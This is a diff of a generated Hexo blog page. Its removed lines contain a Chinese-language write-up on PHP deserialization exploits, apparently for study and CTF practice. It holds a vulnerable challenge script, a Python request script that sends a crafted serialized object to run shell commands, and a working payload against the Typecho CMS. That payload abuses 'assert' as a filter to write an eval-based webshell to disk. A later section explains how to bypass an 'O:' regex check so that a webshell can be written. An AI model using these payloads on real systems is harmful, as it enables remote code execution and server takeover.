class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">come</span></span>&#123;    </span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> $method;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> $args;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim($v));</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">       $str=preg_replace(<span class="string">"/[&lt;&gt;*;|?\n ]/"</span>,<span class="string">""</span>,$str);</span><br><span class="line"></span><br><span class="line">       $str=str_replace(<span class="string">'flag'</span>,<span class="string">''</span>,$str);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> $str;</span><br><span class="line"></span><br><span class="line">   &#125;           </span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">echos</span><span class="params">($host)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">       system(<span class="string">"echos $host"</span>.$host);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"echos"</span>))) &#123;</span><br><span class="line"></span><br><span class="line">           call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$first=<span class="string">'hi'</span>;</span><br><span class="line"></span><br><span class="line">$var=<span class="string">'var'</span>;</span><br><span class="line"></span><br><span class="line">$bbb=<span class="string">'bbb'</span>;</span><br><span class="line"></span><br><span class="line">$ccc=<span class="string">'ccc'</span>;</span><br><span class="line"></span><br><span class="line">$i=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>($i===<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">       &#123;</span><br><span class="line"></span><br><span class="line">           $i++;   </span><br><span class="line"></span><br><span class="line">           $$key = $value;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">else</span>&#123;<span class="keyword">break</span>;&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($first===<span class="string">"doller"</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">   var_dump($_GET[<span class="string">'a'</span>]);</span><br><span class="line">   @parse_str($_GET[<span class="string">'a'</span>]);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>($var===<span class="string">"give"</span>)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>($bbb===<span class="string">"me"</span>)</span><br><span class="line"></span><br><span class="line">       &#123;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span>($ccc===<span class="string">"flag"</span>)</span><br><span class="line"></span><br><span class="line">           &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span><span class="string">"&lt;br&gt;welcome!&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">                $come=@$_POST[<span class="string">'come'</span>];</span><br><span class="line"></span><br><span class="line">                unserialize($come); </span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">       &#123;<span class="keyword">echo</span> <span class="string">"&lt;br&gt;think about it&lt;br&gt;"</span>;&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"NO"</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Can you hack me?&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>有两个小trick需要绕过，都是变量覆盖的漏洞，同时parse_str函数需要接受的是一个字符串，为了在浏览器栏中输入需要将&amp;符号进行URL编码</p>
-<p><code>http://localhost/test/unserialize.php?first=doller&amp;a=var=give%26bbb=me%26ccc=flag</code></p>
-<p>这样就能绕过两个小trick</p>
-<p>之后就是怎么利用那个反序列化了，<code>__construct</code>函数没有什么用，<code>__wakeup</code>方法会将私有属性<code>args</code>通过一个waf函数进行过滤，<code>__destruct</code>函数中有一个危险函数<code>call_user_func_array</code>,注意到调用这个函数的时候传入的是一个数组，其实就是调用这个this类中的一个方法。但是之前的if判断限制了调用的方法只能是<code>echos</code>，分析<code>echos</code>方法发现其中有一个<code>system</code>函数，但是<code>echo</code>错误的拼成了<code>echos</code> 😆</p>
-<p>于是我们的思路就是通过传入反序列化后的值使得echos函数被调用执行我们的命令，这就设计到在Linux或者Windows中一行执行多条命令的方式。</p>
-<p>在Linux中：</p>
-<blockquote>
-<p>&amp;是不管前后命令是否执行成功都会执行前后命令
-&amp;&amp;是前面的命令执行成功才能执行后面的命令
-||是前面的命令执行不成功才能执行后面的命令
-|管道符</p>
-</blockquote>
-<p>构造出反序列化数据如下：</p>
-<p><code>O:4:&quot;come&quot;:2:{s:10:&quot;comeargs&quot;;a:1:{i:0;s:4:&quot;&amp;dir&quot;;}s:12:&quot;comemethod&quot;;s:5:&quot;echos&quot;;}</code></p>
-<p>但是。。。
-<img src="https://i.loli.net/2019/08/11/KREArj6U48vMnsl.png" alt="quicker_bbf51071-3a91-4657-8c29-6818d4d0ba4e.png"></p>
-<p><code>var_dump</code>一下发现了：</p>
-<p><code>:\ProgramFiles\phpstudy\PHPTutorial\WWW\test\unserialize.php:104:string 'O:4:&quot;come&quot;:2:{s:10:&quot;comeargs&quot;;a:1:{i:0;s:4:&quot;' (length=44)</code></p>
-<p>发现数据被截断了。。</p>
-<p>var_dump之前的构造的反序列化数据：</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;come&quot;:2:&#123;s:10:&quot;comeargs&quot;;a:1:&#123;i:0;s:4:&quot;&amp;dir&quot;;&#125;s:12:&quot;comemethod&quot;;s:5:&quot;echos&quot;;&#125;F:\notes\audit\test.php:8:  ---&gt; echo出来的结果</span><br><span class="line">string(86) &quot;O:4:&quot;come&quot;:2:&#123;s:10:&quot;\000come\000args&quot;;a:1:&#123;i:0;s:4:&quot;&amp;dir&quot;;&#125;s:12:&quot;\000come\000method&quot;;s:5:&quot;echos&quot;;&#125;&quot; ---&gt; var_dump出来的结果</span><br></pre></td></tr></table></figure></p>
-<p>因为php在反序列化数据时：</p>
-<blockquote>
-<p>protected属性的表示方式是在变量名前加个%00*%00
-private表示方式是在变量名前加上%00类名%00</p>
-</blockquote>
-<p>所以次数的两个<code>private</code>属性都被加上了00阶段符号，于是只能通过python手动编码传输数据了</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://localhost/test/unserialize.php?first=doller&amp;a=var=give%26bbb=me%26ccc=flag"</span></span><br><span class="line"></span><br><span class="line">n = <span class="string">'00'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">o = <span class="string">'O:4:"come":2:&#123;s:12:"'</span>+n+<span class="string">'come'</span>+n+<span class="string">'method";s:5:"echos";s:10:"'</span>+n+<span class="string">'come'</span>+n+<span class="string">'args";a:1:&#123;i:0;s:4:"&amp;dir";&#125;&#125;"'</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url, data=&#123;<span class="string">"come"</span>:o&#125;)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure></p>
-<p>返回的结果如下：</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/unphp0.png" alt=""></p>
-<p>之后如果要读取flag还有几个姿势，但不是本文的重点了</p>
-<h2>typecho反序列化漏洞</h2>
-<p>先放出payload</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> <span class="keyword">private</span> $_filter=<span class="keyword">array</span>(<span class="string">"assert"</span>);</span><br><span class="line"> <span class="keyword">private</span> $_params=<span class="keyword">array</span>(<span class="string">"screenName"</span>=&gt;<span class="string">"file_put_contents('jrxnm.php', '&lt;?php eval(\$_GET[jrxnm]);');"</span>);	</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">private</span> $_type = <span class="string">'RSS 2.0'</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$item[<span class="string">'author'</span>] = <span class="keyword">new</span> Typecho_Request();</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_items[<span class="number">0</span>] = $item;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$abc = <span class="keyword">new</span> Typecho_Feed();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">array</span>(<span class="string">"adapter"</span>=&gt;$abc,<span class="string">"prefix"</span>=&gt;<span class="string">"_typecho"</span>)));</span><br></pre></td></tr></table></figure></p>
-<p>序列化一个数组之后作为cookie传入，关键代码：</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/typ1.png" alt=""></p>
-<p>此处<code>$config</code>接收cookie中的参数，那么<code>$config</code>此时就是一个数组:</p>
-<p><code>$config = array(&quot;adapter&quot;=&gt;$abc, &quot;prefix&quot;=&gt;&quot;_typecho&quot;)</code></p>
-<p>其中<code>adapter</code>键对应的是一个对象。</p>
-<p><img src="https://i.loli.net/2019/08/11/B4SNL1EYOhpzu9r.png" alt="typ3.png"></p>
-<p>然后<code>$config</code>的两个键值对应的value都作为参数进入了一个类。</p>
-<p>查看该类的构造方法发现存在字符串拼接：</p>
-<p><img src="https://i.loli.net/2019/08/11/vfe6cAPLjRZNr3o.png" alt="typ4.png"></p>
-<p>那么查找<code>__toString()</code>魔术方法，我们发现在<code>Feed.php</code>文件中的一个类：Typecho_Feed</p>
-<p><img src="https://i.loli.net/2019/08/11/D1mYMOHZiAgNwlt.png" alt="typ7.png"></p>
-<p><code>$item['author']-&gt;screenName</code>如果$item['author'] 是一个对象，且不存在screenName属性时，会自动调用__get魔法函数。</p>
-<p>于是我们想要在实例化Typecho_Db类的时候，调用<code>Typecho_Feed</code>类中的<code>__toString</code>方法</p>
-<p>此时继续寻找<code>__get</code>方法：</p>
-<p>在Request.php文件中有一个类Typecho_Request中的<code>__get</code>方法如下：</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取实际传递参数(magic)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $key 指定参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> void</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>继续分析get方法：</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $value = $default;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_params[$key]):</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;_params[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>($_GET[$key]):</span><br><span class="line">            $value = $_GET[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>($_POST[$key]):</span><br><span class="line">            $value = $_POST[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>($_COOKIE[$key]):</span><br><span class="line">            $value = $_COOKIE[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $value = $default;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $value = is_array($value) || strlen($value) &gt; <span class="number">0</span> ? $value : $default;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_filter ? <span class="keyword">$this</span>-&gt;_applyFilter($value) : $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>如果<code>$this-&gt;_filter</code>，就会调用<code>_applyFilter</code>方法：</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_filter) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filter <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">            $value = is_array($value) ? array_map($filter, $value) :</span><br><span class="line">            call_user_func($filter, $value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>此时终于看到了<code>call_user_func</code>方法，函数名是<code>this-&gt;_filter</code></p>
-<h2>再看一道反序列化</h2>
-<p>``php
-&lt;?php
-class Template{
-public $cacheFile = '/tmp/cachefile';
-public $template = '&lt;div&gt;welcome back %s &lt;/div&gt;';</p>
-<pre><code>public function __construct($data=null)
-{
-    $data=$this-&gt;lodaData($data);
-    $this-&gt;render($data);
-}
-
-public function loadData($data){
-    if(substr($data, 0, 2) !== '0:' &amp;&amp; !preg_match('/0:\d:\/', $data)){
-        return unserialize($data);
-    }
-    return [];
-}
-
-public function createCache($file=null, $tpl=null){
-    $file = $file ?? $this-&gt;cacheFile;
-    $tpl = $tpl ?? $this-&gt;template;
-    file_put_contents($file, $tpl);
-}
-
-public function render($data){
-    echo sprintf($this-&gt;template, htmlspecialchars($data['name']));
-}
-
-public function __destruct()
-{
-    $this-&gt;createCache();
-}
-</code></pre>
-<p>}</p>
-<p>new Template($_COOKIE['data']);</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这道题也是反序列化的应用，利用思路很清晰就是通过`__destruct`调用`createCache`写入一个webshell</span><br><span class="line"></span><br><span class="line">重点在于这里：</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">    public function loadData($data)&#123;</span><br><span class="line">        if(substr($data, 0, 2) !== &apos;0:&apos; &amp;&amp; !preg_match(&apos;/0:\d:\/&apos;, $data))&#123;</span><br><span class="line">            return unserialize($data);</span><br><span class="line">        &#125;</span><br><span class="line">        return [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
-<p>如果绕过这个if判断，这里需要分析一下php的源码：在'O:',后面可以增加'+'，用来绕过正则判断。</p>
-<h2>参考</h2>
-<p><a href="https://www.freebuf.com/articles/web/209975.html" target="_blank" rel="noopener">PHP反序列化漏洞简介及相关技巧小结</a></p>
-
-          
+          在freebuf上看到了一篇新的php反
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/11/php反序列化笔记1/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -2505,7 +2215,7 @@ public function __destruct()
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">55</span>
+                  <span class="site-state-item-count">53</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -2527,7 +2237,7 @@ public function __destruct()
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">54</span>
+                  <span class="site-state-item-count">53</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
